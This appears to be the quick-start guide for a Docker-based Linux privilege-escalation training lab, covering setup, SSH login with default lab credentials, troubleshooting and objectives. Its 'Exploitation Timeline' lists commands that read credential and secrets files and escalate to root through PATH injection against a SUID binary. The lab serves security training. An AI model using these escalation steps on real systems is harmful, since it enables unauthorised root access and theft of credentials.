# 🚀 Quick Start Guide

## Prerequisites Check
```bash
# Check Docker installation
docker --version
# Output: Docker version 20.10+

# Check Docker daemon
docker ps
# Output: No errors means Docker daemon is running
```

## Setup in 3 Steps

### Step 1: Clone/Download Lab
```bash
cd c:\Users\Downloads\lab
# Or your desired location
```

### Step 2: Build and Run
```bash
# Make script executable (Linux/Mac)
chmod +x build.sh

# Build and run (all in one)
./build.sh

# Or on Windows with Docker Desktop:
docker build -t privesc-lab .
docker run -d --name privesc-lab -p 2222:22 privesc-lab
```

### Step 3: Connect via SSH
```bash
# Wait 30-60 seconds for SSH to be ready

ssh -p 2222 player1@localhost

# When asked for password:
# password123

# Expected output:
# player1@privesc-lab:~$
```

## Verify Lab is Running
```bash
# Check container status
docker ps | grep privesc-lab

# Test SSH connection
ssh -p 2222 player1@localhost "whoami"
# Output: player1

# View logs
docker logs privesc-lab
```

## Common Commands

```bash
# Start fresh (recommended first time)
./build.sh

# Start stopped lab
./build.sh run

# Stop lab
./build.sh stop

# Full cleanup
./build.sh clean

# View logs
./build.sh logs

# SSH into container
./build.sh ssh

# Get shell access
./build.sh shell
```

## Exploitation Timeline (Recommended)

```
T+0 min:  SSH as player1
          Command: ssh -p 2222 player1@localhost

T+5 min:  Discover credentials in /home/shared
          Command: cat /home/shared/credentials.txt

T+10 min: Read environment secrets
          Command: cat /opt/vault/env.sh

T+15 min: Exploit SUID binary via PATH injection
          Commands:
          mkdir -p /tmp/pwn
          cat > /tmp/pwn/backup-runner << 'EOF'
          #!/bin/bash
          /bin/bash
          EOF
          chmod +x /tmp/pwn/backup-runner
          export PATH=/tmp/pwn:$PATH
          /usr/local/bin/run-backup

T+20 min: Verify root access
          Command: id

T+25 min: Collect flags
          Commands:
          cat /home/shared/credentials.txt
          cat /opt/vault/env.sh
          cat /root/.flag_final
```

## Documentation Files

- **README.md** - Complete lab overview and stage descriptions
- **SOLUTION.md** - Detailed walkthrough for each stage
- **VULNERABILITIES.md** - Technical analysis of each vulnerability
- **QUICKSTART.md** - This file! Quick setup guide
- **CHECKLIST.md** - Verification checklist and testing guide

## Troubleshooting

### SSH Connection Refused
```bash
# Wait longer for SSH daemon to start
sleep 60

# Verify container is running
docker ps | grep privesc-lab

# Check logs
docker logs privesc-lab

# Restart container
docker restart privesc-lab
```

### SSH Permission Denied (FIXED)
```bash
# This was a bug in SSH configuration - now fixed!
# The issue was incorrect AllowUsers configuration

# If you still encounter this:
# 1. Rebuild the image with latest fix
docker build --no-cache -t privesc-lab .
docker rm -f privesc-lab
docker run -d --name privesc-lab -p 2222:22 privesc-lab

# 2. Wait 60 seconds for SSH daemon to start
sleep 60

# 3. Try SSH again
ssh -p 2222 player1@localhost
# Password: password123
```

### Container Won't Start
```bash
# Check Docker daemon
docker ps

# View build logs
docker build -t privesc-lab . --progress=plain

# Clean and rebuild
./build.sh clean
./build.sh build-and-run
```

### SSH Password Not Working
```bash
# Verify you're using correct credentials
User: player1
Password: password123

# Try with verbose mode
ssh -vv -p 2222 player1@localhost

# Check container logs
docker logs privesc-lab | grep -i ssh
```

### Port 2222 Already in Use
```bash
# Find process using port
lsof -i :2222
# or
netstat -tlnp | grep 2222

# Kill the process or use different port
docker run -d -p 3333:22 privesc-lab

# Then connect on new port
ssh -p 3333 player1@localhost
```

## Next Steps

1. **Read README.md** - Understand lab structure and stages
2. **Attempt Exploitation** - Try to escalate privileges
3. **Read SOLUTION.md** - If stuck, check the detailed solution
4. **Study VULNERABILITIES.md** - Understand technical details
5. **Practice Remediation** - Apply security fixes
6. **Repeat** - Do it again from scratch without reading solutions

## Additional Resources

- Linux Privilege Escalation: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- GTFOBins: https://gtfobins.github.io/
- HackTricks: https://book.hacktricks.xyz/
- OWASP: https://owasp.org/www-community/attacks/Privilege_escalation

## Lab Objectives Checklist

- [ ] SSH access as player1
- [ ] Discover credentials in shared directory
- [ ] Access backup user
- [ ] Read environment variables
- [ ] Connect to database
- [ ] Identify SUID binaries
- [ ] Exploit PATH injection
- [ ] Discover sudo rules
- [ ] Escalate to root
- [ ] Collect all 7 flags
- [ ] Document exploitation process
- [ ] Understand each vulnerability
- [ ] Learn remediation techniques

## Support

For issues:
1. Check Troubleshooting section above
2. Review README.md for detailed information
3. Check SOLUTION.md for step-by-step guidance
4. Review VULNERABILITIES.md for technical details

---

**Ready to start?**

```bash
./build.sh

# Then in another terminal:
ssh -p 2222 player1@localhost
```

Good luck! 🎯
